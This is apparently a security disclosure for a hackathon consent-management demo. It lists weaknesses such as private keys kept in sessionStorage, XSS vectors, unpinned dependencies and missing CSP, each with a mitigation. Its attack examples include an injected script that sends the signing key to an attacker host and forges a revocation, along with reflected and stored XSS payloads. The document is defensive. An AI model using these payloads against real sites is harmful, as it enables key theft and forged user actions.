# Security Disclosure - ConsenTide Hackathon Demo

**⚠️ CRITICAL: This is a hackathon demonstration project. DO NOT use in production without significant security hardening.**

---

## 🔴 Known Security Limitations

### 1. sessionStorage Private Key Storage

**Risk Level:** 🔴 **CRITICAL**

**Description:**
Ed25519 private keys are generated client-side and stored in browser `sessionStorage` for the duration of the user's session. This approach is **vulnerable to XSS (Cross-Site Scripting) attacks**.

**Attack Scenario:**
```javascript
// Attacker injects malicious script
<script>
  // Exfiltrate private key from sessionStorage
  const privateKey = sessionStorage.getItem('consentire_private_key');
  fetch('https://attacker.com/steal?key=' + privateKey);
  
  // Sign fraudulent revocation
  const fakeSignature = await signMessage(maliciousMessage, privateKey);
  fetch('/api/v1/consent/revoke/TARGET_CONSENT', {
    method: 'POST',
    body: JSON.stringify({ signature: fakeSignature, ... })
  });
</script>
```

**Impact:**
- Attacker can exfiltrate user's signing key
- Forge revocation requests on behalf of user
- Compromise all consents signed with that key

**Mitigation (Production):**
1. **WebCrypto non-extractable keys:**
   ```javascript
   const keyPair = await crypto.subtle.generateKey(
     'Ed25519',
     false,  // ❌ non-extractable - can't be stolen via XSS
     ['sign', 'verify']
   );
   ```
2. **Hardware Security Module (HSM)** - Keys never leave secure enclave
3. **Browser Wallet Integration** - Like MetaMask, private keys in isolated environment
4. **Server-side signing with MFA** - Backend holds keys, requires multi-factor auth

---

### 2. XSS Attack Vectors

**Risk Level:** 🟠 **HIGH**

#### 2.1 Reflected XSS

**Attack Surface:**
- URL query parameters rendered by Next.js
- Error messages displayed without sanitization
- Form validation feedback

**Example:**
```
https://consentire.app/dashboard?error=<script>alert(sessionStorage.getItem('consentire_private_key'))</script>
```

**Mitigation:**
- ✅ Next.js escapes React expressions by default
- ⚠️ Audit all uses of `dangerouslySetInnerHTML`
- ⚠️ Validate and sanitize URL parameters

#### 2.2 Stored XSS

**Attack Surface:**
- Controller organization names (stored in database, rendered in dashboard)
- Consent purpose descriptions
- User-generated content in governance proposals

**Example:**
```javascript
// Attacker creates controller with malicious name
{
  "organizationName": "<img src=x onerror='stealKeys()'>",
  "controllerId": "..."
}
```

**Mitigation:**
- ✅ PostgreSQL parameterized queries prevent SQL injection
- ⚠️ Must sanitize before rendering in HTML
- 🔴 Currently **NO server-side HTML sanitization**

#### 2.3 DOM-Based XSS

**Attack Surface:**
- Client-side URL parsing
- Dynamic DOM manipulation (e.g., `innerHTML`, `document.write`)
- Client-side templating

**Example:**
```javascript
// Vulnerable code
const purpose = new URLSearchParams(location.search).get('purpose');
element.innerHTML = `<p>Granting consent for: ${purpose}</p>`;
```

**Mitigation:**
- ✅ Use React's JSX (auto-escapes)
- ⚠️ Audit all direct DOM manipulation
- ⚠️ Validate client-side route parameters

#### 2.4 Supply Chain Attacks

**Attack Surface:**
- Compromised npm dependencies
- Malicious package updates
- Unpinned dependency versions

**Example:**
```json
// Vulnerable: accepts any patch version
{
  "dependencies": {
    "@noble/ed25519": "^2.0.0"  // Could pull malicious 2.0.5
  }
}
```

**Current State:**
- 🔴 Dependencies **NOT pinned** (using `^` versioning)
- 🔴 No npm audit in CI/CD
- 🔴 No integrity checks (SRI) for CDN scripts

**Mitigation:**
1. Pin exact versions:
   ```json
   {
     "dependencies": {
       "@noble/ed25519": "2.0.0"  // Exact version only
     }
   }
   ```
2. Run `npm audit` regularly
3. Use `npm ci` instead of `npm install` in production
4. Enable npm provenance attestations

---

### 3. Content Security Policy (CSP)

**Current State:** 🔴 **NOT IMPLEMENTED**

**Risk:**
Without CSP headers, attackers can inject and execute arbitrary scripts.

**Recommended CSP:**
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';  // Remove unsafe-* in production
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://de-api.constellationnetwork.io;
  img-src 'self' data: https:;
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**Implementation:**
```javascript
// backend/src/index.ts
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],  // Remove 'unsafe-inline' for production
      // ...
    }
  }
}));
```

---

### 4. Session Management

**Risk Level:** 🟡 **MEDIUM**

**Issues:**
- JWT tokens stored in localStorage (vulnerable to XSS)
- No token rotation
- No refresh token mechanism
- 24-hour expiration (too long for sensitive ops)

**Recommended:**
1. **httpOnly cookies** for JWT storage (immune to XSS)
2. **Short-lived access tokens** (15 min) + refresh tokens
3. **Token rotation** on sensitive operations
4. **Session termination** on key regeneration

---

### 5. Replay Attack Protection

**Risk Level:** 🟢 **MITIGATED (with limitations)**

**Implementation:**

ConsenTide implements multi-layer replay attack protection for consent revocation:

1. **Timestamp Freshness Validation**
   - Maximum age: 5 minutes (configurable)
   - Prevents replay of old signatures
   - Enforced before signature verification

2. **Nonce Tracking (In-Memory)**
   - Each signature can only be used once
   - Stored in Map<signature, {signature, timestamp}>
   - TTL cleanup removes expired entries every minute

3. **Atomic Signature Reservation**
   - Signature stored BEFORE database revocation
   - If revocation fails, signature is removed (allows retry)
   - Prevents concurrent replay attacks

**Code Example:**
```typescript
// backend/src/routes/consent.ts

// In-memory nonce store
const usedSignatures = new Map<string, NonceEntry>();

// Check for replay
if (usedSignatures.has(signature)) {
  return res.status(401).json({
    code: 'SIGNATURE_REPLAY',
    message: 'This signature has already been used.'
  });
}

// Store signature BEFORE revoke (atomic reservation)
usedSignatures.set(signature, { signature, timestamp: now });

try {
  await revokeConsent(...);
} catch (error) {
  // Remove on failure to allow retry
  usedSignatures.delete(signature);
  throw error;
}
```

**Limitations (Hackathon Demo):**

⚠️ **In-Memory Storage:**
- Nonce store clears on process restart
- Replays possible after server restart (within timestamp window)
- Production must use Redis/database with persistence

⚠️ **Concurrent Requests:**
- Sub-millisecond race conditions theoretically possible
- Unlikely in demo environment (single user)
- Production needs atomic database operations (unique constraints)

⚠️ **No Distributed Coordination:**
- Single-server implementation only
- Multiple backend instances would need shared nonce store
- Production requires Redis cluster or distributed database

**Production Recommendations:**

```typescript
// Use Redis with atomic operations
const redis = new Redis(process.env.REDIS_URL);

// Atomic check-and-set with expiry
const wasUsed = await redis.set(
  `nonce:${signature}`,
  timestamp,
  'EX', 300,  // 5 minute TTL
  'NX'        // Only if not exists
);

if (!wasUsed) {
  throw new Error('SIGNATURE_REPLAY');
}
```

**Attack Scenarios Prevented:**

✅ **Captured Signature Replay:** Blocked by nonce tracking  
✅ **Timestamp Manipulation:** Blocked by 5-minute window  
✅ **Concurrent Replays:** Blocked by atomic reservation  
⚠️ **Post-Restart Replay:** Possible (in-memory limitation)  

---

### 6. CSRF Protection

**Current State:** 🟡 **PARTIAL**

**Protected:**
- API uses JWT Bearer tokens (not vulnerable to CSRF)
- CORS properly configured

**Not Protected:**
- Cookie-based endpoints (if any added in future)
- State-changing GET requests (none currently, but watch for)

**Mitigation:**
- ✅ Continue using JWT Bearer tokens
- ✅ Maintain CORS whitelist
- ⚠️ Never use state-changing GET requests
- ⚠️ Add CSRF tokens if switching to cookie auth

---

## 🟢 Security Features Implemented

### ✅ Cryptographic Best Practices

1. **Ed25519 Signatures**
   - Industry-standard elliptic curve (Curve25519)
   - 32-byte private keys, 64-byte signatures
   - Deterministic signing (no nonce reuse risk)

2. **Password Hashing**
   - bcrypt with 10 salt rounds
   - Adaptive work factor (can increase over time)
   - No plaintext passwords in database

3. **SQL Injection Prevention**
   - Parameterized queries for all database operations
   - Native PostgreSQL driver (`pg`) with automatic escaping

4. **HTTPS-Only (Production)**
   - Replit enforces TLS 1.2+
   - HSTS headers recommended

---

## 📋 Security Checklist for Production

### Pre-Deployment

- [ ] Replace sessionStorage keys with WebCrypto non-extractable keys
- [ ] Implement Content Security Policy (CSP)
- [ ] Pin all npm dependencies to exact versions
- [ ] Run `npm audit` and resolve all vulnerabilities
- [ ] Enable HTTPS-only mode (HSTS headers)
- [ ] Audit all `dangerouslySetInnerHTML` usage
- [ ] Implement rate limiting (express-rate-limit)
- [ ] Add request validation middleware (Joi/Zod)
- [ ] Enable database connection pooling limits
- [ ] Set up monitoring and alerting (Sentry, LogRocket)

### Cryptographic Hardening

- [ ] Rotate JWT secret on compromise
- [ ] Implement key rotation schedule (90 days)
- [ ] Add hardware security module (HSM) integration
- [ ] Implement multi-signature requirements for critical ops
- [ ] Add entropy pool monitoring
- [ ] Enable audit logging for all key operations

### XSS Prevention

- [ ] Server-side HTML sanitization (DOMPurify)
- [ ] Output encoding for all user-generated content
- [ ] Strict CSP with no `unsafe-inline` or `unsafe-eval`
- [ ] Input validation on all API endpoints
- [ ] Implement Subresource Integrity (SRI) for CDN assets

### Session Security

- [ ] Move JWT to httpOnly cookies
- [ ] Implement refresh token rotation
- [ ] Add device fingerprinting
- [ ] Enable concurrent session limits
- [ ] Add logout-all-devices functionality

---

## 🚨 Incident Response

### If Private Key Compromised

1. **Immediate:**
   - User logs out (clears sessionStorage)
   - User generates new keypair on next login
   - Old public key marked as revoked in database

2. **Post-Incident:**
   - Audit all consents signed with compromised key
   - Notify affected controllers
   - Re-sign valid consents with new key

3. **Long-Term:**
   - Implement key expiration (force rotation every 90 days)
   - Add anomaly detection for signature patterns
   - Store key fingerprints in audit logs

---

## 🔍 Audit Trail

All security-relevant actions are logged to `audit_logs` table:

```sql
INSERT INTO audit_logs (
  action,           -- 'consent_granted', 'consent_revoked', 'key_generated'
  user_id,          -- Hashed user identifier
  details,          -- JSONB: {signature, algorithm, timestamp}
  hgtp_tx_hash,     -- Blockchain proof
  timestamp
) VALUES (...)
```

---

## 📞 Security Contacts

**For Hackathon Judges:**
This document serves as full disclosure of security trade-offs made for demo purposes.

**For Production Deployment:**
Please conduct a full security audit before using this code with real user data.

---

## 📚 References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [WebCrypto API Best Practices](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
- [RFC 8032 - EdDSA Signatures](https://www.rfc-editor.org/rfc/rfc8032)
- [NIST SP 800-63B - Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

**Last Updated:** 2025-11-13  
**Version:** Hackathon Demo v1.0  
**Status:** 🔴 **NOT PRODUCTION-READY** - Security hardening required
